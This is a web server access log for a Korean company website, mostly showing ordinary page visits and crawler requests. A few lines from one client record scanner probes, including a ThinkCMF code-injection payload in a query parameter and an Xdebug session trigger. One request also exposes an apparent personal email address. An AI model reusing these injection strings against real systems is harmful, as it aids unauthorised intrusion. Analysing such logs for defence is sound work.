175.223.31.2 - - [07/Feb/2020:07:34:08 +0900] "GET /home/watwedo/overview.do HTTP/1.1" 200 7044
175.223.31.2 - - [07/Feb/2020:07:34:28 +0900] "GET /home/watwedo/history.do HTTP/1.1" 200 8921
175.223.31.2 - - [07/Feb/2020:07:34:29 +0900] "GET /home/watwedo/philosophy.do HTTP/1.1" 200 7553
201.184.136.91 - - [07/Feb/2020:07:42:18 +0900] "GET /index.jsp HTTP/1.1" 302 -
196.52.43.57 - - [07/Feb/2020:07:43:12 +0900] "GET /index.jsp HTTP/1.0" 302 -
207.46.13.73 - - [07/Feb/2020:07:46:33 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
45.33.66.85 - - [07/Feb/2020:07:57:19 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
119.207.72.185 - - [07/Feb/2020:07:59:16 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
187.74.147.121 - - [07/Feb/2020:08:06:18 +0900] "GET /index.jsp HTTP/1.1" 302 -
123.125.71.27 - - [07/Feb/2020:08:07:57 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 8279
123.125.71.56 - - [07/Feb/2020:08:07:58 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
111.206.221.3 - - [07/Feb/2020:08:07:59 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
111.206.221.91 - - [07/Feb/2020:08:08:01 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
77.75.77.72 - - [07/Feb/2020:08:11:32 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
169.197.108.38 - - [07/Feb/2020:08:12:22 +0900] "GET /index.jsp HTTP/1.1" 302 -
157.55.39.165 - - [07/Feb/2020:08:22:57 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
193.111.62.163 - - [07/Feb/2020:08:27:42 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
5.101.0.209 - - [07/Feb/2020:08:35:54 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
157.55.39.165 - - [07/Feb/2020:08:40:11 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
5.101.0.209 - - [07/Feb/2020:08:41:51 +0900] "GET /index.jsp?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 302 -
5.101.0.209 - - [07/Feb/2020:08:41:52 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
5.101.0.209 - - [07/Feb/2020:08:41:52 +0900] "GET /index.jsp?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 302 -
5.101.0.209 - - [07/Feb/2020:08:41:53 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
157.55.39.134 - - [07/Feb/2020:08:44:24 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
5.101.0.209 - - [07/Feb/2020:08:46:07 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
18.236.174.82 - - [07/Feb/2020:08:46:34 +0900] "GET /index.jsp HTTP/1.1" 302 -
18.236.174.82 - - [07/Feb/2020:08:46:34 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
34.219.192.170 - - [07/Feb/2020:08:46:34 +0900] "GET /index.jsp HTTP/1.1" 302 -
34.219.192.170 - - [07/Feb/2020:08:46:35 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
66.249.79.157 - - [07/Feb/2020:08:48:57 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
104.222.43.18 - - [07/Feb/2020:08:57:57 +0900] "GET /index.jsp HTTP/1.1" 302 -
104.222.43.18 - - [07/Feb/2020:08:57:58 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
66.249.79.58 - - [07/Feb/2020:09:04:09 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
66.249.79.55 - - [07/Feb/2020:09:10:30 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
77.75.76.160 - - [07/Feb/2020:09:16:46 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
207.46.13.73 - - [07/Feb/2020:09:17:40 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
119.202.244.205 - - [07/Feb/2020:09:21:59 +0900] "GET /filter/checker.jsp?campaignID=806&email=asd52p@naver.com&responseEnd=2019-01-06 HTTP/1.1" 404 3570
61.78.99.241 - - [07/Feb/2020:09:25:24 +0900] "GET /index.jsp HTTP/1.1" 302 -
61.78.99.241 - - [07/Feb/2020:09:25:24 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
61.78.99.241 - - [07/Feb/2020:09:25:26 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 30366
61.78.99.241 - - [07/Feb/2020:09:25:28 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
61.78.99.241 - - [07/Feb/2020:09:25:31 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 30366
223.38.11.67 - - [07/Feb/2020:09:26:11 +0900] "GET /index.jsp HTTP/1.1" 302 -
223.38.11.67 - - [07/Feb/2020:09:26:11 +0900] "GET /home/main/main.do HTTP/1.1" 302 -
223.38.11.67 - - [07/Feb/2020:09:26:11 +0900] "GET /home/main/main.do HTTP/1.1" 200 8898
223.38.11.67 - - [07/Feb/2020:09:26:11 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
223.38.11.67 - - [07/Feb/2020:09:26:16 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 44336
193.111.62.163 - - [07/Feb/2020:09:26:42 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
223.38.11.67 - - [07/Feb/2020:09:26:48 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 44336
223.38.11.67 - - [07/Feb/2020:09:27:01 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 44336
107.178.195.51 - - [07/Feb/2020:09:28:48 +0900] "GET /index.jsp HTTP/1.1" 302 -
119.207.72.77 - - [07/Feb/2020:09:30:43 +0900] "GET /home/watwedo/philosophy.do HTTP/1.1" 200 7162
119.207.72.66 - - [07/Feb/2020:09:30:44 +0900] "GET /home/watwedo/philosophy.do HTTP/1.1" 200 7162
52.87.171.209 - - [07/Feb/2020:09:39:39 +0900] "GET /index.jsp HTTP/1.1" 302 -
52.87.171.209 - - [07/Feb/2020:09:39:39 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
52.87.171.209 - - [07/Feb/2020:09:39:41 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
121.254.147.237 - - [07/Feb/2020:09:43:05 +0900] "GET /index.jsp HTTP/1.1" 302 -
121.254.147.237 - - [07/Feb/2020:09:43:05 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
101.78.95.139 - - [07/Feb/2020:09:46:02 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
157.55.39.134 - - [07/Feb/2020:09:48:32 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
185.225.17.181 - - [07/Feb/2020:09:48:55 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
107.178.195.55 - - [07/Feb/2020:09:56:40 +0900] "GET /index.jsp HTTP/1.1" 302 -
12.190.238.198 - - [07/Feb/2020:09:58:03 +0900] "GET /index.jsp HTTP/1.1" 302 -
12.190.238.198 - - [07/Feb/2020:09:58:03 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
12.190.238.198 - - [07/Feb/2020:09:58:19 +0900] "GET /home/watwedo/overview.do HTTP/1.1" 200 6147
12.190.238.198 - - [07/Feb/2020:09:58:28 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 30366
12.190.238.198 - - [07/Feb/2020:09:58:56 +0900] "GET /home/about/about.do HTTP/1.1" 200 14216
107.178.195.51 - - [07/Feb/2020:10:01:57 +0900] "GET /index.jsp HTTP/1.1" 302 -
101.78.95.139 - - [07/Feb/2020:10:02:23 +0900] "GET /index.jsp HTTP/1.1" 302 -
101.78.95.139 - - [07/Feb/2020:10:02:24 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
101.78.95.139 - - [07/Feb/2020:10:02:40 +0900] "GET /home/en/meetourpartners/all.do HTTP/1.1" 200 95227
101.78.95.139 - - [07/Feb/2020:10:02:46 +0900] "GET /home/en/whoweare/korea.do HTTP/1.1" 200 30344
101.78.95.139 - - [07/Feb/2020:10:03:18 +0900] "GET /home/en/whoweare/korea.do HTTP/1.1" 200 30344
101.78.95.139 - - [07/Feb/2020:10:03:34 +0900] "GET /home/en/about/about.do HTTP/1.1" 200 14811
101.78.95.139 - - [07/Feb/2020:10:04:56 +0900] "GET /home/en/whoweare/korea.do HTTP/1.1" 200 30344
101.78.95.139 - - [07/Feb/2020:10:04:56 +0900] "GET /home/en/contact/contact.do HTTP/1.1" 200 5187
101.78.95.139 - - [07/Feb/2020:10:05:01 +0900] "GET /home/en/whoweare/korea.do HTTP/1.1" 200 30344
157.55.39.52 - - [07/Feb/2020:10:05:49 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
13.228.6.37 - - [07/Feb/2020:10:05:53 +0900] "GET /home/en/meetourpartners/all.do HTTP/1.1" 200 95227
101.78.95.139 - - [07/Feb/2020:10:06:42 +0900] "GET /home/en/contact/contact.do HTTP/1.1" 200 5187
101.78.95.139 - - [07/Feb/2020:10:07:22 +0900] "GET /home/en/whoweare/korea.do HTTP/1.1" 200 30344
59.6.135.60 - - [07/Feb/2020:10:07:41 +0900] "GET /home/news/news/view.do?num=2 HTTP/1.1" 302 -
59.6.135.60 - - [07/Feb/2020:10:07:41 +0900] "GET /home/news/news/view.do?num=2 HTTP/1.1" 200 71892
101.78.95.139 - - [07/Feb/2020:10:11:23 +0900] "GET /home/en/contact/contact.do HTTP/1.1" 200 5187
101.78.95.139 - - [07/Feb/2020:10:11:38 +0900] "GET /home/en/whoweare/korea.do HTTP/1.1" 200 30344
101.78.95.139 - - [07/Feb/2020:10:13:45 +0900] "GET /home/en/contact/contact.do HTTP/1.1" 200 5187
101.78.95.139 - - [07/Feb/2020:10:14:03 +0900] "GET /home/en/whoweare/korea.do HTTP/1.1" 200 30344
157.55.39.23 - - [07/Feb/2020:10:14:21 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
157.55.39.165 - - [07/Feb/2020:10:14:40 +0900] "GET /index.jsp HTTP/1.1" 302 -
157.55.39.34 - - [07/Feb/2020:10:19:04 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
157.55.39.165 - - [07/Feb/2020:10:19:28 +0900] "GET /index.jsp HTTP/1.1" 302 -
193.111.62.163 - - [07/Feb/2020:10:28:08 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
77.75.77.11 - - [07/Feb/2020:10:29:26 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
101.78.95.139 - - [07/Feb/2020:10:32:18 +0900] "GET /home/en/contact/contact.do HTTP/1.1" 200 5187
69.171.251.17 - - [07/Feb/2020:10:32:51 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
173.252.83.17 - - [07/Feb/2020:10:33:36 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
173.252.83.17 - - [07/Feb/2020:10:33:36 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
23.100.232.233 - - [07/Feb/2020:10:37:36 +0900] "GET /home/en/meetourpartners/domestic.do HTTP/1.1" 200 69240
157.55.39.165 - - [07/Feb/2020:10:38:34 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
171.82.156.130 - - [07/Feb/2020:10:49:47 +0900] "GET /index.jsp HTTP/1.1" 302 -
38.99.62.91 - - [07/Feb/2020:11:00:20 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
38.99.62.91 - - [07/Feb/2020:11:00:59 +0900] "GET /home/news/news/view.do?page=&num=5 HTTP/1.1" 200 9109
38.99.62.91 - - [07/Feb/2020:11:01:39 +0900] "GET /home/news/news/view.do?page=&num=6 HTTP/1.1" 200 9118
38.99.62.91 - - [07/Feb/2020:11:02:04 +0900] "GET /home/news/news/view.do?page=&num=5 HTTP/1.1" 200 9109
38.99.62.91 - - [07/Feb/2020:11:02:44 +0900] "GET /home/news/news/view.do?page=2&num=10 HTTP/1.1" 200 6756
38.99.62.91 - - [07/Feb/2020:11:03:09 +0900] "GET /home/news/news/view.do?page=2&num=9 HTTP/1.1" 200 9135
38.99.62.91 - - [07/Feb/2020:11:03:49 +0900] "GET /home/news/news/view.do?page=2&num=10 HTTP/1.1" 200 6756
38.99.62.91 - - [07/Feb/2020:11:04:28 +0900] "GET /home/news/news/view.do?page=&num=6 HTTP/1.1" 200 9118
38.99.62.91 - - [07/Feb/2020:11:05:08 +0900] "GET /home/en/meetourpartners/all.do HTTP/1.1" 200 95227
62.171.135.115 - - [07/Feb/2020:11:05:19 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
38.99.62.91 - - [07/Feb/2020:11:05:33 +0900] "GET /home/news/news/view.do?page=&num=7 HTTP/1.1" 200 5545
38.99.62.91 - - [07/Feb/2020:11:06:52 +0900] "GET /home/news/news/view.do?page=&num=8 HTTP/1.1" 200 9166
38.99.62.91 - - [07/Feb/2020:11:07:57 +0900] "GET /home/news/news/view.do?page=&num=9 HTTP/1.1" 200 9132
176.36.7.43 - - [07/Feb/2020:11:08:05 +0900] "GET /index.jsp HTTP/1.1" 302 -
38.99.62.91 - - [07/Feb/2020:11:08:36 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
38.99.62.91 - - [07/Feb/2020:11:09:16 +0900] "GET /home/news/news/view.do?page=&num=8 HTTP/1.1" 200 9166
38.99.62.91 - - [07/Feb/2020:11:09:55 +0900] "GET /home/en/meetourpartners/all.do HTTP/1.1" 200 95227
38.99.62.91 - - [07/Feb/2020:11:10:35 +0900] "GET /home/news/news/view.do?page=&num=9 HTTP/1.1" 200 9132
66.249.79.55 - - [07/Feb/2020:11:10:39 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
34.74.6.88 - - [07/Feb/2020:11:11:05 +0900] "GET /error/kr/error.jsp HTTP/1.0" 500 3570
34.74.6.88 - - [07/Feb/2020:11:11:05 +0900] "GET /index.jsp HTTP/1.0" 302 -
34.74.6.88 - - [07/Feb/2020:11:11:05 +0900] "GET /error/kr/error.jsp HTTP/1.0" 500 3570
34.74.6.88 - - [07/Feb/2020:11:11:06 +0900] "GET /home/en/main/main.do HTTP/1.0" 200 11080
38.99.62.91 - - [07/Feb/2020:11:11:14 +0900] "GET /home/news/news/view.do?page=&num=10 HTTP/1.1" 200 6753
38.99.62.91 - - [07/Feb/2020:11:11:54 +0900] "GET /home/news/news/view.do?page=&num=9 HTTP/1.1" 200 9132
38.99.62.91 - - [07/Feb/2020:11:12:33 +0900] "GET /home/news/news/view.do?page=&num=10 HTTP/1.1" 200 6753
38.99.62.91 - - [07/Feb/2020:11:13:13 +0900] "GET /home/news/news/view.do?page=&num=11 HTTP/1.1" 200 5545
38.99.62.91 - - [07/Feb/2020:11:14:31 +0900] "GET /home/news/news/view.do?page=&num=12 HTTP/1.1" 200 9080
38.99.62.91 - - [07/Feb/2020:11:14:57 +0900] "GET /home/news/news/view.do?page=&num=11 HTTP/1.1" 200 5545
38.99.62.91 - - [07/Feb/2020:11:15:22 +0900] "GET /home/news/news/view.do?page=&num=12 HTTP/1.1" 200 9080
38.99.62.91 - - [07/Feb/2020:11:16:01 +0900] "GET /home/news/news/view.do?page=&num=13 HTTP/1.1" 200 9156
38.99.62.91 - - [07/Feb/2020:11:16:41 +0900] "GET /home/news/news/view.do?page=&num=12 HTTP/1.1" 200 9080
77.75.79.62 - - [07/Feb/2020:11:16:44 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
38.99.62.91 - - [07/Feb/2020:11:17:20 +0900] "GET /home/news/news/view.do?page=&num=13 HTTP/1.1" 200 9156
38.99.62.91 - - [07/Feb/2020:11:18:00 +0900] "GET /home/news/news/view.do?page=&num=14 HTTP/1.1" 200 6733
34.74.6.88 - - [07/Feb/2020:11:18:16 +0900] "GET /error/kr/error.jsp HTTP/1.0" 500 3570
34.74.6.88 - - [07/Feb/2020:11:18:16 +0900] "GET /index.jsp HTTP/1.0" 302 -
34.74.6.88 - - [07/Feb/2020:11:18:17 +0900] "GET /error/kr/error.jsp HTTP/1.0" 500 3570
34.74.6.88 - - [07/Feb/2020:11:18:17 +0900] "GET /home/en/main/main.do HTTP/1.0" 200 11080
38.99.62.91 - - [07/Feb/2020:11:18:39 +0900] "GET /home/news/news/view.do?page=&num=13 HTTP/1.1" 200 9156
38.99.62.91 - - [07/Feb/2020:11:19:19 +0900] "GET /home/news/news/view.do?page=&num=14 HTTP/1.1" 200 6733
157.55.39.134 - - [07/Feb/2020:11:19:28 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
38.99.62.91 - - [07/Feb/2020:11:19:58 +0900] "GET /home/news/news/view.do?page=&num=15 HTTP/1.1" 200 9178
38.99.62.91 - - [07/Feb/2020:11:20:38 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
38.99.62.91 - - [07/Feb/2020:11:21:17 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
38.99.62.91 - - [07/Feb/2020:11:21:43 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
193.111.62.163 - - [07/Feb/2020:11:21:58 +0900] "GET /home/news/news/list.do HTTP/1.1" 200 7091
38.99.62.91 - - [07/Feb/2020:11:22:22 +0900] "GET /home/news/news/view.do?page=&num=14 HTTP/1.1" 200 6733
38.99.62.91 - - [07/Feb/2020:11:23:02 +0900] "GET /home/news/news/view.do?page=&num=15 HTTP/1.1" 200 9178
203.133.168.244 - - [07/Feb/2020:11:23:14 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
203.133.168.244 - - [07/Feb/2020:11:23:14 +0900] "GET /home/news/news/view.do?page=2&num=5 HTTP/1.1" 200 9112
38.99.62.91 - - [07/Feb/2020:11:23:41 +0900] "GET /home/en/meetourpartners/all.do HTTP/1.1" 200 95227
38.99.62.91 - - [07/Feb/2020:11:24:21 +0900] "GET /home/news/news/view.do?page=&num=16 HTTP/1.1" 200 5663
38.99.62.91 - - [07/Feb/2020:11:24:46 +0900] "GET /home/news/news/view.do?page=&num=15 HTTP/1.1" 200 9178
42.56.228.63 - - [07/Feb/2020:11:24:57 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
157.55.39.134 - - [07/Feb/2020:11:25:04 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
38.99.62.91 - - [07/Feb/2020:11:25:12 +0900] "GET /home/en/meetourpartners/all.do HTTP/1.1" 200 95227
38.99.62.91 - - [07/Feb/2020:11:25:51 +0900] "GET /home/news/news/view.do?page=&num=16 HTTP/1.1" 200 5663
38.99.62.91 - - [07/Feb/2020:11:26:31 +0900] "GET /home/news/news/view.do?page=&num=17 HTTP/1.1" 200 5758
38.99.62.91 - - [07/Feb/2020:11:27:10 +0900] "GET /home/news/news/view.do?page=&num=16 HTTP/1.1" 200 5663
185.181.102.18 - - [07/Feb/2020:11:27:16 +0900] "GET /index.jsp HTTP/1.1" 302 -
185.181.102.18 - - [07/Feb/2020:11:27:18 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
185.181.102.18 - - [07/Feb/2020:11:27:21 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
185.181.102.18 - - [07/Feb/2020:11:27:24 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
185.181.102.18 - - [07/Feb/2020:11:27:30 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
38.99.62.91 - - [07/Feb/2020:11:27:36 +0900] "GET /home/news/news/view.do?page=&num=17 HTTP/1.1" 200 5758
210.179.63.92 - - [07/Feb/2020:11:27:57 +0900] "GET /index.jsp HTTP/1.1" 302 -
210.179.63.92 - - [07/Feb/2020:11:27:57 +0900] "GET /home/main/main.do HTTP/1.1" 302 -
210.179.63.92 - - [07/Feb/2020:11:27:57 +0900] "GET /home/main/main.do HTTP/1.1" 200 8898
210.179.63.92 - - [07/Feb/2020:11:27:57 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3762
210.179.63.92 - - [07/Feb/2020:11:28:00 +0900] "GET /home/watwedo/overview.do HTTP/1.1" 200 7044
210.179.63.92 - - [07/Feb/2020:11:28:05 +0900] "GET /home/watwedo/philosophy.do HTTP/1.1" 200 7553
210.179.63.92 - - [07/Feb/2020:11:28:06 +0900] "GET /home/watwedo/history.do HTTP/1.1" 200 8921
210.179.63.92 - - [07/Feb/2020:11:28:09 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 44336
38.99.62.91 - - [07/Feb/2020:11:28:15 +0900] "GET /home/news/news/view.do?page=&num=18 HTTP/1.1" 200 9134
210.179.63.92 - - [07/Feb/2020:11:28:16 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 44336
39.98.124.123 - - [07/Feb/2020:11:28:54 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
38.99.62.91 - - [07/Feb/2020:11:28:55 +0900] "GET /home/news/news/view.do?page=&num=17 HTTP/1.1" 200 5758
38.99.62.91 - - [07/Feb/2020:11:29:34 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
203.133.168.244 - - [07/Feb/2020:11:29:55 +0900] "GET /home/news/news/view.do?page=1&num=17 HTTP/1.1" 200 5761
157.55.39.134 - - [07/Feb/2020:11:30:04 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
38.99.62.91 - - [07/Feb/2020:11:30:14 +0900] "GET /home/news/news/view.do?page=&num=18 HTTP/1.1" 200 9134
38.99.62.91 - - [07/Feb/2020:11:30:54 +0900] "GET /home/news/news/view.do?page=&num=19 HTTP/1.1" 200 6162
38.99.62.91 - - [07/Feb/2020:11:31:33 +0900] "GET /home/news/news/view.do?page=&num=18 HTTP/1.1" 200 9134
38.99.62.91 - - [07/Feb/2020:11:31:59 +0900] "GET /home/news/news/view.do?page=&num=19 HTTP/1.1" 200 6162
38.99.62.91 - - [07/Feb/2020:11:33:17 +0900] "GET /home/news/news/view.do?page=&num=10 HTTP/1.1" 200 6753
38.99.62.91 - - [07/Feb/2020:11:33:57 +0900] "GET /home/news/news/view.do?page=&num=7 HTTP/1.1" 200 5545
34.211.63.241 - - [07/Feb/2020:11:34:31 +0900] "GET /index.jsp HTTP/1.1" 302 -
38.99.62.91 - - [07/Feb/2020:11:34:36 +0900] "GET /home/news/news/view.do?page=&num=6 HTTP/1.1" 200 9118
203.133.168.244 - - [07/Feb/2020:11:35:12 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
203.133.168.244 - - [07/Feb/2020:11:35:12 +0900] "GET /home/news/news/view.do?page=&num=8 HTTP/1.1" 200 9166
38.99.62.91 - - [07/Feb/2020:11:35:16 +0900] "GET /home/news/news/view.do?page=1&num=12 HTTP/1.1" 200 9083
38.99.62.91 - - [07/Feb/2020:11:35:55 +0900] "GET /home/news/news/view.do?page=1&num=13 HTTP/1.1" 200 9159
38.99.62.91 - - [07/Feb/2020:11:36:35 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
157.55.39.134 - - [07/Feb/2020:11:36:56 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
38.99.62.91 - - [07/Feb/2020:11:37:14 +0900] "GET /home/news/news/view.do?page=1&num=13 HTTP/1.1" 200 9159
38.99.62.91 - - [07/Feb/2020:11:37:54 +0900] "GET /home/news/news/view.do?page=1&num=14 HTTP/1.1" 200 6736
23.100.232.233 - - [07/Feb/2020:11:38:18 +0900] "GET /home/en/meetourpartners/domestic.do HTTP/1.1" 200 69240
38.99.62.91 - - [07/Feb/2020:11:38:33 +0900] "GET /home/news/news/view.do?page=1&num=13 HTTP/1.1" 200 9159
38.99.62.91 - - [07/Feb/2020:11:39:13 +0900] "GET /home/news/news/view.do?page=1&num=14 HTTP/1.1" 200 6736
38.99.62.91 - - [07/Feb/2020:11:39:52 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
38.99.62.91 - - [07/Feb/2020:11:40:18 +0900] "GET /home/news/news/view.do?page=1&num=15 HTTP/1.1" 200 9181
38.99.62.91 - - [07/Feb/2020:11:41:37 +0900] "GET /home/news/news/view.do?page=1&num=16 HTTP/1.1" 200 5666
38.99.62.91 - - [07/Feb/2020:11:42:16 +0900] "GET /home/news/news/view.do?page=1&num=15 HTTP/1.1" 200 9181
157.55.39.165 - - [07/Feb/2020:11:42:53 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
38.99.62.91 - - [07/Feb/2020:11:42:56 +0900] "GET /home/news/news/view.do?page=1&num=16 HTTP/1.1" 200 5666
38.99.62.91 - - [07/Feb/2020:11:43:35 +0900] "GET /home/news/news/view.do?page=1&num=17 HTTP/1.1" 200 5761
38.99.62.91 - - [07/Feb/2020:11:44:00 +0900] "GET /home/news/news/view.do?page=1&num=16 HTTP/1.1" 200 5666
38.99.62.91 - - [07/Feb/2020:11:44:40 +0900] "GET /home/news/news/view.do?page=1&num=17 HTTP/1.1" 200 5761
38.99.62.91 - - [07/Feb/2020:11:45:19 +0900] "GET /home/news/news/view.do?page=1&num=18 HTTP/1.1" 200 9137
38.99.62.91 - - [07/Feb/2020:11:45:59 +0900] "GET /home/news/news/view.do?page=1&num=17 HTTP/1.1" 200 5761
38.99.62.91 - - [07/Feb/2020:11:46:38 +0900] "GET /home/news/news/view.do?page=1&num=18 HTTP/1.1" 200 9137
38.99.62.91 - - [07/Feb/2020:11:47:18 +0900] "GET /home/news/news/view.do?page=1&num=19 HTTP/1.1" 200 6164
38.99.62.91 - - [07/Feb/2020:11:47:43 +0900] "GET /home/news/news/view.do?page=1&num=18 HTTP/1.1" 200 9137
38.99.62.91 - - [07/Feb/2020:11:48:23 +0900] "GET /home/news/news/view.do?page=1&num=19 HTTP/1.1" 200 6164
38.99.62.91 - - [07/Feb/2020:11:49:02 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
157.55.39.165 - - [07/Feb/2020:11:49:25 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
38.99.62.91 - - [07/Feb/2020:11:49:42 +0900] "GET /home/news/news/view.do?page=1&num=19 HTTP/1.1" 200 6164
187.120.131.41 - - [07/Feb/2020:11:50:10 +0900] "GET /index.jsp HTTP/1.1" 302 -
38.99.62.91 - - [07/Feb/2020:11:50:21 +0900] "GET /home/news/news/view.do?page=1&num=14 HTTP/1.1" 200 6736
38.99.62.91 - - [07/Feb/2020:11:51:01 +0900] "GET /home/news/news/view.do?page=1&num=12 HTTP/1.1" 200 9083
38.99.62.91 - - [07/Feb/2020:11:51:40 +0900] "GET /home/news/news/view.do?page=2&num=10 HTTP/1.1" 200 6756
38.99.62.91 - - [07/Feb/2020:11:52:20 +0900] "GET /home/news/news/view.do?page=2&num=9 HTTP/1.1" 200 9135
38.99.62.91 - - [07/Feb/2020:11:52:59 +0900] "GET /home/news/news/view.do?page=2&num=10 HTTP/1.1" 200 6756
112.223.134.82 - - [07/Feb/2020:11:53:31 +0900] "GET /index.jsp HTTP/1.1" 302 -
112.223.134.82 - - [07/Feb/2020:11:53:31 +0900] "GET /home/en/main/main.do HTTP/1.1" 200 11080
38.99.62.91 - - [07/Feb/2020:11:53:39 +0900] "GET /home/news/news/view.do?page=&num=6 HTTP/1.1" 200 9118
112.223.134.82 - - [07/Feb/2020:11:54:16 +0900] "GET /index.jsp HTTP/1.1" 302 -
112.223.134.82 - - [07/Feb/2020:11:54:16 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
112.223.134.82 - - [07/Feb/2020:11:54:17 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
38.99.62.91 - - [07/Feb/2020:11:54:18 +0900] "GET /home/en/meetourpartners/all.do HTTP/1.1" 200 95227
147.47.22.12 - - [07/Feb/2020:11:54:34 +0900] "GET /index.jsp HTTP/1.1" 302 -
147.47.22.12 - - [07/Feb/2020:11:54:34 +0900] "GET /home/main/main.do HTTP/1.1" 200 12222
147.47.22.12 - - [07/Feb/2020:11:54:38 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
147.47.22.12 - - [07/Feb/2020:11:54:41 +0900] "GET /home/whoweare/korea.do HTTP/1.1" 200 30366
38.99.62.91 - - [07/Feb/2020:11:54:58 +0900] "GET /home/news/news/view.do?page=&num=7 HTTP/1.1" 200 5545
38.99.62.91 - - [07/Feb/2020:11:55:37 +0900] "GET /home/meetourpartners/all.do HTTP/1.1" 200 101569
147.47.22.12 - - [07/Feb/2020:11:55:46 +0900] "GET /index.jsp HTTP/1.1" 302 -
157.55.39.23 - - [07/Feb/2020:11:55:48 +0900] "GET /error/kr/error.jsp HTTP/1.1" 500 3570
157.55.39.52 - - [07/Feb/2020:11:55:50 +0900] "GET /home/watwedo/overview.do HTTP/1.1" 200 6147
38.99.62.91 - - [07/Feb/2020:11:56:17 +0900] "GET /home/news/news/view.do?page=&num=6 HTTP/1.1" 200 9118
38.99.62.91 - - [07/Feb/2020:11:56:57 +0900] "GET /home/news/news/view.do?page=2&num=9 HTTP/1.1" 200 9135
38.99.62.91 - - [07/Feb/2020:11:57:36 +0900] "GET /home/news/news/view.do?page=2&num=8 HTTP/1.1" 200 9169
38.99.62.91 - - [07/Feb/2020:11:58:16 +0900] "GET /home/news/news/view.do?page=2&num=9 HTTP/1.1" 200 9135
38.99.62.91 - - [07/Feb/2020:11:58:55 +0900] "GET /home/news/news/view.do?page=2&num=9 HTTP/1.1" 200 9135
